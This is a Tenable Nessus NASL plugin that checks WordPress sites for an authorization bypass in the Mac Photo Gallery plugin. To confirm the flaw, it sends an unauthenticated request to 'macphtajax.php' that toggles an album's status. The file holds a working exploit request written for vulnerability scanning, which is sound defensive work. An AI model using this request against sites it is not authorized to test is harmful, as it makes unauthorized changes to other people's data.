#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(62314);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2015/09/24 23:21:23 $");

  script_bugtraq_id(55480);
  script_osvdb_id(85333);
  script_xref(name:"Secunia", value:"49923");
  script_xref(name:"Secunia", value:"50481");

  script_name(english:"Mac Photo Gallery Plugin for WordPress 'macphtajax.php' Access Restriction Bypass");
  script_summary(english:"Attempts to modify the status of an album.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
security bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Mac Photo Gallery Plugin for WordPress installed on the remote
host is affected by a security bypass vulnerability because the
'macphtajax.php' script fails to properly authorize users. This may
allow an attacker to bypass access restrictions and perform
unauthorized actions.

It is possible that the 'macalbajax.php' script is also affected;
however, Nessus has not tested that script.");
  # http://plugins.trac.wordpress.org/browser/mac-dock-gallery/trunk?rev=576587
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?36166630");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time. Version 3.0 of the plugin reportedly addresses
the issue, but there are reports that version 3.0 is still affected.
An attacker must know or obtain a static token for successful
exploitation in version 3.0.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/09/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/09/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl", "wordpress_mac_photo_gallery_file_disclosure.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);
plugin = 'Mac Photo Gallery';

get_kb_item_or_exit("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

# Grab out initial status and the first album id
get_status = "wp-content/plugins/mac-dock-gallery/macalblist.php?pages=1";

res = http_send_recv3(
  method       : "GET",
  item         : dir + "/" + get_status,
  port         : port,
  exit_on_fail : TRUE
);

chk_status =  eregmatch(pattern:
  "onclick=macAlbum_status\('(OFF|ON)?',([0-9]+)\)",
  string:res[2]
);

if (empty_or_null(chk_status))
  exit(1, "Nessus was unable to obtain an album id for " + plugin + " installed under " + install_url + ".");

status = chk_status[1];
id = chk_status[2];

if (status == "ON") {
  set = "ON";
  int_status = "OFF";
}
else
{
  set = "OFF";
  int_status = "ON";
}
exploit = "wp-content/plugins/mac-dock-gallery/macphtajax.php?status=" + set + "&albid=" + id;

# Toggle album status to demonstrate auth bypass
res2 = http_send_recv3(
  method       : "GET",
  item         : dir + "/" + exploit,
  port         : port,
  exit_on_fail : TRUE
);

chk_option = eregmatch(
  pattern:"onclick=macAlbum_status\('(OFF|ON)?',([0-9]+)\)",
  string:res2[2]
);

if (!isnull(chk_option) && chk_option[1] != status)
{
  if (report_verbosity > 0)
  {
    snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
    report =
      '\nNessus was able to verify the issue using the following request to' +
      '\nmodify the status of album id ' + id + ' from ' + int_status + ' to ' + set + " :" +
      '\n' +
      '\n' + install_url + exploit+
      '\n';
      if (report_verbosity > 1)
      {
        report +=
          '\nNessus first confirmed that status of album id ' + id + ' was set to ' + int_status +
          '\nwith the following request :' +
          '\n' +
          '\n' + install_url + get_status +
          '\n';
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
